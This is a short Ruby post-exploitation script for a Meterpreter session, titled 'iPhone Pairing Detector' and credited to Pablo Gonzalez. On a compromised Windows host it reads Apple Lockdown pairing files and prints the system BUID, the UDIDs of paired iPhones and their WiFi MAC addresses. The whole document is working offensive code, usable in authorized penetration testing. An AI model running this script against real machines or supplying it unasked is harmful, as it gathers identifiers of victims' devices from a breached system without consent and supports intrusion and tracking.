#Autor: Pablo Gonzalez
#iPhone Pairing Detector v0.1 (beta)

if client.platform !~ /win32|win64/
        print_line "No compatible"
        raise Rex::Script::Completed
end

opts = Rex::Parser::Arguments.new(
        "-h" => [false, "Help menu"]
)

opts.parse(args) { |opt, idx, val|
        case opt
        when "-h"
		print_line "Help Menu"
                print_line(opts.usage)
                raise Rex::Script::Completed
	end
}

#ruta = "/private/var/db/lockdown/"
ruta="c:\\ProgramData\\Apple\\Lockdown\\"
entradas = client.fs.dir.entries(ruta)

entradas.each do |f|

	if f.eql? "SystemConfiguration.plist"
		e = session.fs.file.open(ruta+f)
               	fs_xml = ""
               	fs_xml << e.read
               	e.close
	
		doc = REXML::Document.new(fs_xml).root
                opt = doc.elements.to_a("dict/key")
       	        opt1 = doc.elements.to_a("dict/string")

		puts
		puts "SystemBUID: #{opt1[0].text}"
	
	else
		if (f.eql? ".")
			next
		end
		if (f.eql? "..")
			next
		end
		puts
		udid = f.split(".")[0]
		puts "Device found! UDID:#{udid}"

		e = session.fs.file.open(ruta+f)
		fs_xml = ""
		fs_xml << e.read
		e.close
		
		doc = REXML::Document.new(fs_xml).root

		opt = doc.elements.to_a("dict/key")
		opt1 = doc.elements.to_a("dict/string")
		puts "WiFi Mac Address: #{opt1[2].text}"

	end
end
